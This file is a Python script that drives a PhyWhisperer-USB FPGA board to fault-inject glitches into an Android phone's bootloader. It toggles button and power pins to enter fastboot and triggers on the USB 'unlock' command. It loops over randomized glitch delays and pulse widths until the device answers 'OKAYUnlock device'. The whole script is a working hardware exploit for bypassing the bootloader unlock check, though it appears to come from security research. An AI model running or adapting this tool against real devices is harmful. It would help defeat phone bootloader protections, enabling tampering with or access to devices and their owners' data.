#!/usr/bin/env python3

import getopt
import sys
import fastboot
import time
import phywhisperer.usb as pw

CFG_DELAY = 505
CFG_COUNT = 400
CFG_PULSE = 45
CFG_QUIET = False

if __name__ == "__main__":
  opts, leftover = getopt.getopt(sys.argv[1:],"qd:c:p:",["quiet","delay=","count=","pulsewidth="])
  for opt, arg in opts:
    if opt in ["-d","--delay"]:
      CFG_DELAY = int(arg)
    elif opt in ["-c","--count"]:
      CFG_COUNT = int(arg)
    elif opt in ["-p","--pulsewidth"]:
      CFG_PULSE = int(arg)
    elif opt in ["-q","--quiet"]:
      CFG_QUIET = True

print("-" * 80)
print(" - CFG_COUNT is %d" % CFG_COUNT)
print(" - CFG_PULSE is %d" % CFG_PULSE)
print(" - CFG_DELAY is %d" % CFG_DELAY)
if CFG_QUIET is True:
  print(" - CFG_QUIET set, oct6 blocker disabled")
print("-" * 80)
sys.stdout.flush()


phy = pw.Usb()
phy.con(program_fpga=True)

buttonState = 0
PULSEWIDTH = 55

def togglePin(in_bit):
  global buttonState
  if in_bit >= 7:
    print("error: max is d7")
    return
  buttonState = buttonState ^ (1 << in_bit)
  phy.write_reg(phy.REG_USERIO_DATA,[buttonState])

def clearGPIO():
  phy.set_power_source("off")
  phy.write_reg(phy.REG_USERIO_DATA,[0])

def enterFastboot():
  PIN_RST = 0
  PIN_PWR = 1
  PIN_VOL = 2
  PIN_FET = 3
  print("enterFastboot: holding down pwr/vol")
  togglePin(PIN_PWR) 
  togglePin(PIN_VOL)
  time.sleep(0.5) 
  togglePin(PIN_FET) 
  time.sleep(0.5)
  print("enterFastboot: holding rst")
  togglePin(PIN_RST)
  time.sleep(0.5)
  print("enterFastboot: releasing rst")
  togglePin(PIN_RST)
  time.sleep(5.0)
  print("enterFastboot: releasing vol")
  togglePin(PIN_VOL)
  print("enterFastboot: releasing pwr")
  togglePin(PIN_PWR)
  print("enterFastboot: you should be in fastboot...") 
 
# flashing unlock
capturemask = [0x75,0x6e,0x6c,0x6f,0x63,0x6b]
# usb descriptor
# capturemask = [0x80, 0x06, 0x01, 0x03, 0x00, 0x00,0xFE,0x0F]

def resetFPGA():
  global phy,capturemask
  phy.reset_fpga()
  phy.set_power_source("off")
  phy.write_reg(phy.REG_USERIO_PWDRIVEN,[0xFF])
  phy.write_reg(phy.REG_USERIO_DATA,[0x0])
 
packetPrinter = pw.USBSimplePrintSink(highspeed=False)

c = None
doResetAll = True
import random

glitchCtr = 0
while glitchCtr <= CFG_COUNT:
  sys.stdout.flush()
  glitchCtr += 1
  ret = ""
  PULSEWIDTH = random.randint(CFG_PULSE,CFG_PULSE + 10)
  delay_time = random.randint(CFG_DELAY,CFG_DELAY + 10)
  if doResetAll:
    print("[%f] Resetting FPGA state" % delay_time)
    resetFPGA()
  print("[%f] Entering attempt %d" % (delay_time,glitchCtr))
  phy.set_pattern(capturemask,mask=[0xFF for c in capturemask])
  us_delay = delay_time
  print("True delay: %f, pulse width %d" % (us_delay,PULSEWIDTH))
  print("[%f] Resetting device and trying again" % delay_time)
  # phy.set_usb_mode(mode="HS")
  if doResetAll:
    enterFastboot()
    time.sleep(1.5)
    phy.set_power_source("5V")
    time.sleep(1.5)
    c = fastboot.ClingWrap()
  try:
    print("Entering fast glitch cycle...")
    phy.set_capture_size(512)
    phy.set_pattern(capturemask,mask=[0xFF for c in capturemask])
    phy.set_trigger(enable=True,delays=[us_delay],widths=[phy.ns_trigger(PULSEWIDTH)])
    phy.arm()
    time.sleep(0.5)
    # ret = c.getDescr(slp=delay_time)
    ret = c.bulkTransfer(slp=delay_time)
    doResetAll = False
    time.sleep(0.5)
  except Exception as e:
    print(e)
    doResetAll = True
    print("[%f] GREPTHIS Hard powering off device (exception)" % delay_time)
    phy.set_power_source("off")
    togglePin(3) # PIN_FET
    time.sleep(1.0)
    raw = phy.read_capture_data()
    packets = phy.split_packets(raw)
    for packet in packets:
      if len(packet["contents"]) == 3 or len(packet["contents"]) == 1:
        continue
      packetPrinter.handle_usb_packet(ts=packet["timestamp"],buf=bytearray(packet["contents"]),flags=0)
    continue
  if ret is False:
    doResetAll = True
    print("[%f] Needs a reset" % delay_time)
  if ret != False:
    if "unlock flag is invalid" in ret:
      print("Unlock flag condition, resetting")
      doResetAll = True
    if "OKAYUnlock device" in ret:
      input("Got a successful glitch, waiting for user input...")
    disarm_ctr = 0
    while disarm_ctr < 150:
      time.sleep(0.01)
      if phy.armed() is False:
        break
      else:
        disarm_ctr += 1
        continue
    if disarm_ctr == 150:
      doResetAll = True
      print("error: stalled on .armed(), don't know why, forcing reset")
    else:
      pass
      # raw = phy.read_capture_data()
      # packets = phy.split_packets(raw)
      # for packet in packets:
      #   if len(packet["contents"]) == 3 or len(packet["contents"]) == 1:
      #     continue
      #   packetPrinter.handle_usb_packet(ts=packet["timestamp"],buf=bytearray(packet["contents"]),flags=0)
  if doResetAll:
    print("[%f] Hard powering off device" % delay_time)
    phy.set_power_source("off")
    togglePin(3) # PIN_FET
    time.sleep(1.0)

clearGPIO()

if CFG_QUIET is True:
  print("CFG_QUIET is set, skipping oct6 blocker")
  sys.exit(0)

while True:
  x = input("enter 'quit' to exit (prevent mega fuckups like oct6)")
  if x.rstrip() == "quit":
    import sys
    sys.exit(0)
